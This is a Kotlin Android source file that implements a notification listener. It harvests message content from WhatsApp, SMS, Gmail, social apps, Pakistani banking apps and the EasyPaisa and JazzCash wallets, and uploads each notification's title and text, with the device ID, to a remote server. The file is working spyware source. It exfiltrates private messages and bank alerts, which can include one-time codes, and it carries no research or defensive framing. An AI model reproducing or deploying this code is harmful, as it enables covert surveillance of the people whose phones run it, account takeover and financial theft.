package com.csk4.app

import android.app.Notification
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "CSK4_NOTIF"
        var isConnected = false
        
        // Apps to capture
        private val CAPTURE_PACKAGES = setOf(
            "com.whatsapp",                          // WhatsApp
            "com.whatsapp.w4b",                      // WhatsApp Business
            "com.google.android.apps.messaging",     // Google Messages
            "com.android.mms",                       // SMS
            "com.samsung.android.messaging",         // Samsung Messages
            "com.google.android.gm",                 // Gmail
            "com.instagram.android",                 // Instagram
            "com.facebook.katana",                   // Facebook
            "com.facebook.orca",                     // Messenger
            "org.telegram.messenger",                // Telegram
            "com.snapchat.android",                  // Snapchat
            "com.twitter.android",                   // Twitter/X
            "com.linkedin.android",                  // LinkedIn
            "com.imo.android.imoim",                 // IMO
            "com.google.android.apps.nbu.paisa.user",// Google Pay
            "com.android.vending",                   // Play Store
            "com.android.systemui",                  // System
            "com.hbl.android.hblmobilebanking",      // HBL
            "com.ubl.mobilebanking",                 // UBL
            "com.mcb.mcbmobile",                     // MCB
            "com.meezan.mb",                         // Meezan
            "com.easypaisa",                         // EasyPaisa
            "com.jazzcash"                           // JazzCash
        )
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        isConnected = true
        Log.d(TAG, "✅ Notification listener connected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        isConnected = false
        Log.d(TAG, "❌ Notification listener disconnected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        try {
            val pkg = sbn.packageName ?: return
            
            // Skip our own notifications
            if (pkg == packageName) return

            // Only capture from important apps
            if (pkg !in CAPTURE_PACKAGES) return

            val notification = sbn.notification ?: return
            val extras = notification.extras ?: return

            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
            val bigText = extras.getString(Notification.EXTRA_BIG_TEXT) ?: ""
            val subText = extras.getString(Notification.EXTRA_SUB_TEXT) ?: ""
            
            // Skip if no content
            if (title.isEmpty() && text.isEmpty() && bigText.isEmpty()) return

            val messageText = if (bigText.isNotEmpty()) bigText else text
            val displayText = if (subText.isNotEmpty()) "$subText: $messageText" else messageText

            Log.d(TAG, "📬 $pkg: $title - $displayText")

            // Determine notification type
            val type = when {
                pkg.contains("whatsapp") -> "whatsapp"
                pkg.contains("messaging") || pkg.contains("mms") -> "sms"
                pkg.contains("gmail") -> "gmail"
                pkg.contains("instagram") -> "instagram"
                pkg.contains("facebook") -> "facebook"
                pkg.contains("telegram") -> "telegram"
                pkg.contains("snapchat") -> "snapchat"
                pkg.contains("bank") || pkg.contains("hbl") || pkg.contains("ubl") ||
                pkg.contains("mcb") || pkg.contains("meezan") -> "bank"
                pkg.contains("easypaisa") || pkg.contains("jazzcash") -> "wallet"
                else -> "other"
            }

            // Save to local DB first (offline support)
            val localStorage = LocalStorage(this)
            localStorage.addNotification(pkg, title, displayText)
            localStorage.addActivity(type, JSONObject().apply {
                put("package", pkg)
                put("title", title)
                put("text", displayText)
            }.toString())

            // Send to server immediately
            uploadNotification(pkg, title, displayText, type)

            // Special handling for WhatsApp
            if (type == "whatsapp") {
                handleWhatsApp(title, displayText)
            }

        } catch (e: Exception) {
            Log.e(TAG, "Notification error: ${e.message}")
        }
    }

    private fun handleWhatsApp(from: String, message: String) {
        try {
            val localStorage = LocalStorage(this)
            localStorage.addWhatsApp(from, message)
        } catch (e: Exception) {}
    }

    private fun uploadNotification(pkg: String, title: String, text: String, type: String) {
        try {
            val deviceId = Settings.Secure.getString(
                contentResolver, Settings.Secure.ANDROID_ID)
            
            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("package", pkg)
                put("title", title)
                put("text", text)
                put("type", type)
                put("token", Config.DEVICE_TOKEN)
            }

            Volley.newRequestQueue(this).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/notification",
                json,
                { Log.d(TAG, "✅ Notification uploaded") },
                { Log.e(TAG, "❌ Upload fail: ${it.message}") }
            ))

            // WhatsApp separate endpoint
            if (type == "whatsapp") {
                val waJson = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("from", title)
                    put("message", text)
                    put("token", Config.DEVICE_TOKEN)
                }
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST,
                    "${Config.SERVER_URL}/api/device/whatsapp",
                    waJson,
                    null, null
                ))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload exception: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional: Track removed notifications
    }
}
